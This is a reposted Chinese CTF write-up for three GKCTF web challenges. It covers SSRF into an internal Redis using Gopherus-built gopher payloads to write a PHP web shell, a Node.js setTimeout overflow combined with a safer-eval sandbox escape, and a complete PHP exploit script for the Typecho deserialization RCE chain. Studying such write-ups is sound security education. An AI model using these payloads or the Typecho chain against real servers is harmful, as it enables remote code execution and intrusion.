<!--yml
category: 未分类
date: 2022-04-26 14:36:44
-->

# ctf php 流量分析题,GKCTF EZWEB的分析题解和思考_一点能源的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_35674742/article/details/115123240](https://blog.csdn.net/weixin_35674742/article/details/115123240)

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

GKCTF EZ三剑客-EzWeb

看到这个题前端和我自己出的一个题实在是很像，同样是输入一个url，先看题目长啥样吧。

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

嗯，啥也没有，输入url基本没反应，F12给的提示是?secret，输入后发现：

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

这就很敏感了，相当于一个

ifconfig

的命令，这个时候应该是SSRF打内网，看内网的存活主机有多少，直接burp抓个包爆破一下有新发现：

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

这个IP的其他端口有问题？不多说，nmap一把梭看看有哪些常见==问题端口== 很骚的一个点就是nmap如果不强调-p-参数`或者指定端口貌似不会扫6379 端口的，也就是redis 端口，而这个无疑是问题端口中的问题端口，因此可以指定扫6379端口：

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

下面其实就很明了了，redis未授权访问嘛，但是是内网啊，你咋访问？结合url，其实就知道是通过gopher协议来动手脚，gopher打Mysql和redis网上很多分析文章，这里简单说一下原理。

gopher攻击redis原理

先得从==RESP==协议开始

Redis服务器与客户端通过RESP(REdis Serialization Protocol)协议通信。

RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。

RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。

RESP在Redis中用作请求 – 响应协议的方式如下：

客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。

服务器根据命令实现回复一种RESP类型。

在RESP中，某些数据的类型取决于第一个字节：

对于Simple Strings，回复的第一个字节是+

对于error，回复的第一个字节是-

对于Integer，回复的第一个字节是:

对于Bulk Strings，回复的第一个字节是$

对于array，回复的第一个字节是*

此外，RESP能够使用稍后指定的Bulk Strings或Array的特殊变体来表示Null值。

在RESP中，协议的不同部分始终以”rn”(CRLF)结束。

用tcpdump抓包分析一下，redis客户端执行以下命令：

set name test

>OK

get name

>"test"

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

客户端向将命令作为Bulk String的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。

我们就拿上面的数据包分析，首先是*3，代表数组的长度为3(可以简单理解为用空格为分隔符将命令分割为([“set”,”name”,”test”])； $4代表字符串的长度，0d0a即rn表示结束符；+OK表示服务端执行成功后返回的字符串

那么攻击的原理也就是利用gopher来生成一个符合redis RESP协议的payload，这里推荐使用Gopherus这款工具，可以直接构造mysql、redis等gopher的payload。

python Gopherus.py --exploit --redis #指定是redis

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

直接把payload放到之前的url框中，然后在访问shell.php

注意：ip应为内网存在redis服务的ip,而并非现在这个开放80端口的机子ip，访问的时候也是访问前者的ip/shell.php文件

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

然后直接在构造一个echo system("cat /flag")写入指定php中即可

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

然后访问存在redis主机的ip/shell.php：

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

GKCTF EZ三剑客-Eznode

看到这个题发现是一个Nodejs写的，并且使用的是express框架，题目给了源码，这里贴一下(省略了无关紧要的路由部分，加上了代码注释)：

const express = require('express'); //用的是express框架

const bodyParser = require('body-parser');

const saferEval = require('safer-eval'); // 2019.7/WORKER1 找到一个很棒的库

const fs = require('fs');

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));

app.use(bodyParser.json());

// 2020.1/WORKER2 老板说为了后期方便优化

app.use((req, res, next) => { //在/eval路由中，设置了delay默认是60000

if (req.path === '/eval') {

let delay = 60 * 1000;

console.log(delay);

if (Number.isInteger(parseInt(req.query.delay))) {

//将get请求的delay返回整数后判断是否为整数

delay = Math.max(delay, parseInt(req.query.delay));

//选取默认的delay值和传参的delay值的最大值

}

const t = setTimeout(() => next(), delay);

// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事

setTimeout(() => {

clearTimeout(t);

console.log('timeout');

try {

res.send('Timeout!');

} catch (e) {

}

}, 1000);

} else {

next();

}

});

app.post('/eval', function (req, res) {

let response = '';

if (req.body.e) {

try {

response = saferEval(req.body.e);

} catch (e) {

response = 'Wrong Wrong Wrong!!!!';

}

}

res.send(String(response));

});

const saferEval = require('safer-eval')nodejs的题在ha1cyon出现了几次，一般涉及到nodejs的题就是沙箱逃逸，而导致能够沙箱逃逸的，通常都是库的问题，题目有特地强调了这个safer-eval的库，直接去github找issues

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

人证物证时间证都在，应该就是这个点了，花点功夫看下逻辑是啥，这里直接把代码内容放在注释中。最关键的点仔细谈一谈：

setTimeout的分析

setTimeout，第一个参数为回调函数，第二个参数表示从当前时刻开始过多少毫秒后开始执行回调函数

setTimeout(() => {handler }, time); //在{handler}中执行你的方法，time是过多久执行

我们举个例子

(function test() {

var timer = setTimeout(function (name) {

console.log('hello', name)

}, 3000, 'Micheal')

});

// 如果设定了clearTimeout，将不再执行setTimeout中的回调函数，参数值为setTimeout函数返回的定时器对象

(function test() {

var timer = setTimeout(function (name) {

console.log('hello', name)

}, 3000, 'Micheal')

clearTimeout(timer) //在3秒之内已经执行了clear，因此不会调用回调函数

});

所以我们结合来看

setTimeout(() => {

clearTimeout(t);

console.log('timeout');

try {

res.send('Timeout!');

} catch (e) {

}

}, 1000);

} else {

next();

}

});

进入eval需要至少6秒，而在1秒内便会clearTimeout(t)使得无法进入下一个eval路由,我们如果能进入调用eval的方法，那么通过req.body.e结合沙箱溢出便能RCE。

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

当我们传入的delay大于该值时，delay会变为1，那么就是说在1毫秒时调用回调函数，快于1秒时进行clearTimeout(t)，因此再结合沙箱溢出的payload可以成功进行RCE。

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

EZ三剑客-EzTypecho

这个题已经出现过加强版的了，在MRCTF里出现过typecho反序列化利用PHP原生类Soapclient打SSRF的题，这里对比了一下原始版本的typecho反序列化漏洞，发现构造的payoad几乎一眼，这里就跟着链子走一路：

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

当设置了session后，会对Typecho_Cookie::get('__typecho_config')base64解码后反序列化，先回溯一下：

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

可以看到这一段是可控的，得到$config后便其传入Typecho_Db中，跟进看看

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

发现是将这个参数当成字符串拼接了，那么如果这个$config['adapter']是一个其他类，并且该类有toString方法，就可以触发魔术方法，全局搜索一下：

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

在Typecho_Feed类中找到标记的语句，还有出题人的提示QAQ,这里调用了$item['author']->screenName，如果该类是一个不能存在screenName属性的类的话，那么这里就会调用这个类的__get()魔术方法，在Request.php中发现了这么一个魔术方法，

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

这里的$key就是"screenName",继续跟进get()方法

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

$value可控，直接跟进到这个方法：

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

链子到这里基本结束了，这里调用了call_user_func，而两个参数都是我们可控的，所以直接就能够RCE。

贴下exp：

$cmd = 'system("ls")';

class Typecho_Feed

{

const RSS2 = 'RSS 2.0';

const ATOM1 = 'ATOM 1.0';

private $_type;

private $_items;

public function __construct() {

//$this->_type = $this::RSS2;

$this->_type = $this::ATOM1;

$this->_items[0] = array(

'category' => array(new Typecho_Request()),

'author' => new Typecho_Request(),

);

}

}

class Typecho_Request

{

private $_params = array();

private $_filter = array();

public function __construct() {

$this->_params['screenName'] = $GLOBALS[cmd];

$this->_filter[0] = 'assert';

}

}

$exp = array(

'adapter' => new Typecho_Feed(),

'prefix' => 'typecho_'

);

echo base64_encode(serialize($exp));

?>

生成payload之后再来触发反序列化条件，但是这个题并没有看到session_start()，貌似只能找找其他触发点了：

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

finish参数由于没有session已经被阻挡了

如果有start参数，并且Referer设置为本站时，可以触发反序列化操作，进行RCE

![209117](img/ecf64e5806a85f442d50a4fd789ac6ff.png)

总结

总的来说，做的这三个EZ题目难度没有特别大，但是出的质量也还挺好的，也是强化了一些思维，比如针对url想到CRLF或者SSRF探测内网，nodejs题目多往沙箱逃逸方向思考，善于利用Github等等，总而言之，对自己而言收获还是很大的